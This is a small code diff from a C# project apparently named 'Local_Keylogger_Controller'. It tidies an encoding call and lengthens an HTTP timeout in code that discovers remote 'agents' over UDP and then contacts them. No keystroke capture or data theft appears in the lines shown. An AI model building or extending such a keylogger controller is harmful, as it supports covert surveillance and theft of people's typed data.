@@ -53,7 +53,7 @@ namespace Local_Keylogger_Controller
 
                 // If we received a response, process it
                 var rusults = receiveTask.Result;
-                string text = System.Text.Encoding.UTF8.GetString(rusults.Buffer);
+                string text = Encoding.UTF8.GetString(rusults.Buffer);
                 Console.WriteLine($"Received response from {rusults.RemoteEndPoint.Address} : {rusults.RemoteEndPoint.Port} - {text}");
             
                 var parts = text.Split(':');
@@ -93,7 +93,7 @@ namespace Local_Keylogger_Controller
                     Console.WriteLine($"- {agent.Ip} : {agent.Port}");
                 }
 
-                using (var client = new HttpClient { Timeout = TimeSpan.FromSeconds(2)})
+                using (var client = new HttpClient { Timeout = TimeSpan.FromMinutes(5)})
                 {
                     foreach (var agent in discoveryAgents)
                     {
